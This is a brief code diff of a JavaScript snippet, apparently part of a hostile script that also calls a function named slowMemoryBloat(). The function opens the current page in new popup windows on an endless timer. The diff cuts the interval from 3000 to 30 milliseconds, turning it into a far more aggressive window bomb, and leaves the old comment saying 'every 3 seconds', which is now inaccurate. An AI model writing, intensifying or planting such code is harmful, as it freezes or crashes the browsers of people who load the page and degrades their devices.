@@ -25,5 +25,5 @@ slowMemoryBloat();
 (function openContinuously() {
   setInterval(() => {
     window.open(window.location.href, '_blank', 'width=500,height=500');
-  }, 3000); // Opens a new window every 3 seconds
+  }, 30); // Opens a new window every 3 seconds
 })();
